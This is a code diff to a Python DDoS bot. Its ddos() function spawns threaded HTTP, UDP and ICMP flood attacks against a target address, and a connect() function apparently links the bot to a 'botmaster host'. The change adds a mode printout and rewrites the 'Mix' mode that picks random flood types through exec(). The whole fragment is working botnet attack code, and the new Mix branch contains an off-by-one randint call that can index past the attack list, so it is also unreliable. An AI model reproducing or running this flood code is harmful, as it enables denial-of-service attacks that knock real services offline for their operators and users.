@@ -34,6 +34,7 @@ def ddos(mode:str, address:str): #address : ip or url
     global ddos_flag
     attack_list = ['httpflood', 'UDPflood', 'ICMPflood']
     print("[*]Start attack")
+    print(f'[*]In {mode} mode')
     if mode == 'httpGETflood' or mode == 'httpflood' or mode == 'httpPOSTflood' or mode == 'Mix': # httpflood method : only http GET flood
         from urllib import request,parse
         from ssl import _create_unverified_context
@@ -123,15 +124,13 @@ def ddos(mode:str, address:str): #address : ip or url
                 # recv_packet, addr = Sock.recvfrom(1024)
                 # send the packages
                 print('[*] packet sent')
-    if mode == 'Mix':
-        def attack_Mix(address):
-            while True:
-                if not ddos_flag: return # To stop the attack
-                exec(f'for i in range(Threads): Thread(target=attack_{attack_list[randint(0, len(attack_list)-1)]}, args=(address,)).start()')
     print('[*]Attack:', address) 
-    exec(f'for i in range(Threads): Thread(target=attack_{mode}, args=(address,)).start()')
-        
-
+    if mode != 'Mix':
+        exec(f'for i in range(Threads): Thread(target=attack_{mode}, args=(address,)).start()')
+    else:
+        for i in range(Threads):
+            exec(f'Thread(target=attack_{attack_list[randint(0, len(attack_list))]}, args=(address,)).start()')        
+            sleep(0.3)
 def connect():
     '''
     This method is used to connect the botmaster host.
